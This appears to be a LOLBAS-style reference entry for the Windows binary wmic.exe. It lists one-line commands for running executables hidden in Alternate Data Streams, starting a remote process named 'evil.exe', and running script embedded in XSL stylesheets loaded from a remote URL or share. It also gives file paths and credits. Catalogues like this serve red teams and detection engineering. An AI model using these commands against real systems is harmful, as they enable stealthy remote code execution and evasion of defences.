## Wmic.exe
```

wmic.exe process call create calc
Execute calc.exe.

wmic.exe process call create "c:\ads\file.txt:program.exe"
Execute a .EXE file stored as an Alternate Data Stream (ADS).

wmic.exe /node:"192.168.0.1" process call create "evil.exe"
Execute evil.exe on the remote system.

wmic.exe process get brief /format:"https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"
Execute a script contained in the target .XSL file hosted on a remote server.

wmic.exe os get /format:"MYXSLFILE.xsl"
Executes JScript or VBScript embedded in the target XSL stylesheet.

wmic.exe process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"
Executes JScript or VBScript embedded in the target remote XSL stylsheet.
```
* Windows binary: True   
* Bypasses Default AppLocker Rules: False   
* Mitre: []()   
   
* Links:   
  * https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory
  * https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html
  * https://twitter.com/subTee/status/986234811944648707
   
* File path:   
  * c:\windows\system32\wbem\wmic.exe
  * c:\windows\sysWOW64\wbem\wmic.exe
   
* Acknowledgement:   
  * Name: Casey Smith
    * Twitter: [@subtee ](https://twitter.com/@subtee )
    * Blog: https://subt0x11.blogspot.com
   
OS:  
